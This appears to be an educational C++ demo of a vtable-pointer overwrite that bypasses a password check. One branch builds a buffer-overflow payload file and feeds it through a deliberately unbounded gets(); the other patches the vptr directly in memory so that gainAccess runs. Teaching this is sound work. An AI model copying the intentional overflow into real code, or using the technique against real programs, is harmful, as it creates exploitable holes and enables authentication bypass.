// Exploiting Vulnerability using VPtr Overwrite
// DISCLAIMER: This code is for educational purposes only. It demonstrates
// vulnerabilities that should NEVER be used in a production environment or
// for malicious intent.

#include <iostream>
#include <stdio.h>
#include <string.h>
#include <openssl/sha.h>
#include <iomanip>
#include <fstream>

using namespace std;

// Base class representing a user with credentials
class BaseUser
{
private:
    char name[100];
    unsigned char password_hash[SHA256_DIGEST_LENGTH];

public:
    // Constructor hashes the password using SHA256
    BaseUser(char name[], const char *pw)
    {
        strcpy(this->name, name);
        SHA256((const unsigned char *)pw, strlen(pw), this->password_hash);
    }

    virtual void gainAccess()
    {
        cout << "Access granted." << endl;
    }

    virtual void denyAccess()
    {
        cout << "Access denied." << endl;
    }

    void checkAccess(const char *pw)
    {
        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256((const unsigned char *)pw, strlen(pw), hash);
        cout << "User password hash: " << password_hash << endl;
        cout << "Checking password: " << pw << endl;
        if (memcmp(hash, password_hash, SHA256_DIGEST_LENGTH) == 0)
        {
            this->gainAccess();
        }
        else
        {
            this->denyAccess();
        }
    }
};

// Vulnerability Showcase: Using gets() introduces buffer overflow vulnerabilities.
// WARNING: Never use gets() in real-world applications.
char *gets(char *str)
{
    char *ret = str;
    int c;
    while ((c = getchar()) != '\n' && c != EOF)
    {
        *str++ = c;
    }
    *str = '\0';
    return ret;
}

#ifdef NO_PIE
// Demonstrating how vptr can be overwritten when there is no PIE
void run_type()
{
    cout << "Running without PIE - overwrite vptr through input." << endl;
}

void buffer_access()
{
    // Demonstrate how buffer overflows can affect vptr
    BaseUser base("John", "abc");
    char pw[4];
    BaseUser *b = &base;

    int *p = reinterpret_cast<int *>(b); // cast to int pointer to print vptr
    cout << "vptr: 0x" << hex << p[0] << endl;

    // Write a buffer to a file to demonstrate the overflow
    ofstream outfile("pass.bin", ios::out | ios::binary);
    if (outfile.is_open())
    {
        for (int i = 0; i < sizeof(pw); i++)
        {
            char c = 'A';
            outfile.write(&c, sizeof(c));
        }
        int address = p[0] - 8;

        outfile.write(reinterpret_cast<const char *>(&address), sizeof(address));
        outfile.close();
    }
    else
    {
        cout << "Unable to open file." << endl;
    }

    ifstream infile("pass.bin", ios::in | ios::binary);
    if (infile.is_open())
    {
        // Get the length of the file
        infile.seekg(0, ios::end);
        int length = infile.tellg();
        infile.seekg(0, ios::beg);

        // Allocate a buffer to hold the file contents
        char *buffer = new char[length];

        // Read the file contents into the buffer
        infile.read(buffer, length);

        cout << "Overflow buffer was generated: ";
        // Print the contents of the buffer in hexadecimal format
        for (int i = 0; i < length; i++)
        {
            cout << hex << static_cast<int>(buffer[i]) << " ";
        }
        cout << endl;

        // Free the buffer
        delete[] buffer;

        infile.close();
    }
    else
    {
        cout << "Unable to open file." << endl;
    }

    cout << "\nWarning: Passing the address through the terminal may involve unprintable characters.\n"
         << "\tIf you haven't already piped the file \"pass.bin\",\n"
         << "\tstart the program again with the following command:\n\n"
         << "./overflow_demo < pass.bin" << endl;

    cout << "\nPassword: [quit and pipe...]" << endl;
    gets(pw);
    b->checkAccess(pw);
}

#else
// Demonstrating direct vptr modification when PIE is enabled
void run_type()
{
    cout << "Running with PIE - modify vptr directly." << endl;
}

void vptr_access()
{
    char name[100] = "John";
    BaseUser base(name, "abc");
    char pw[100];

    cout << "(Password does not matter - we will overwrite the vptr)\nEnter password: ";
    cin >> pw;

    BaseUser *b = &base;

    int *p = reinterpret_cast<int *>(b); // cast to int pointer to overwrite the vptr
    cout << "vptr: 0x" << hex << p[0] << endl;

    *p = (*p) - 8;
    cout << "vptr now points to gainAccess: 0x" << hex << *p << endl;

    b->checkAccess(pw); // this will call gainAccess instead of denyAccess because the vptr points to gainAccess
}

#endif

int main()
{
    // Entry point: Run the appropriate demonstration based on compilation flags
    run_type();
#ifdef NO_PIE
    buffer_access();
#else
    vptr_access();
#endif
    return 0;
}
